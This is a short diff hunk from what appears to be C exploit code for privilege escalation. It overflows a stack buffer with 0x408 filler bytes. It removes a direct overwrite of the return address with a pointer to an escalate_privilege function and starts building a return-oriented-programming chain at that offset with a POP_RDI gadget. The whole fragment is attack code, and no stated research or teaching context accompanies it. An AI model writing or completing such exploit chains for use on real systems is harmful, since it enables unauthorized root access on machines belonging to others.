@@ -98,7 +98,6 @@ int main()
 
     char buf[BUF_SIZE] = {};
     memset(buf, 'a', 0x408);
-    *(unsigned long*)&buf[0x408] = (unsigned long)&escalate_privilege;
 
     unsigned long *chain = (unsigned long *)&buf[0x408];
     *chain++ = POP_RDI;
